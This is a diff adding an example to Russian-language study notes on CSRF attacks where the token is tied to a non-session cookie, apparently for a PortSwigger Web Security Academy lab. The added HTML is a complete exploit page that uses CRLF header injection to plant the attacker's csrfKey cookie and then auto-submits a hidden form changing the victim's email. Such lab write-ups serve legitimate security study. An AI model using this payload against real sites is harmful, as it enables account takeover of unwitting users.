@@ -138,3 +138,18 @@ csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
 ```
 
 Эту ситуацию сложнее эксплуатировать, но она по прежнему уязвима. Если на сайте есть какое либо поведение, позволяющее атакующему устанавливать cookie  браузере жертвы, то атака возможна. Атакующий может войти в приложение под своей учетной записью, получить валидный токен и связанный cookie, воспользоваться функциональностью установки cookie, чтобы поместить свой cookie в браузер жертвы и подставить свой токен жертве в атаке CSRF
+
+## Пример 
+
+```html
+<html>
+  <body>
+    <form action="https://0a6500dc033545b98010038b00cf0036.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@evil.com" />
+      <input type="hidden" name="csrf" value="UlqmsYKKN47pRaLP4gGmlEoDKPnHc7oI" />
+    </form>
+    <img src="https://0a6500dc033545b98010038b00cf0036.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=1HGSUV1ofkNugVRfbnGvQOEJY9tv6nBX%3b%20SameSite=None"
+         onerror="setTimeout(()=>document.forms[0].submit(), 1000);" />
+  </body>
+</html>
+```
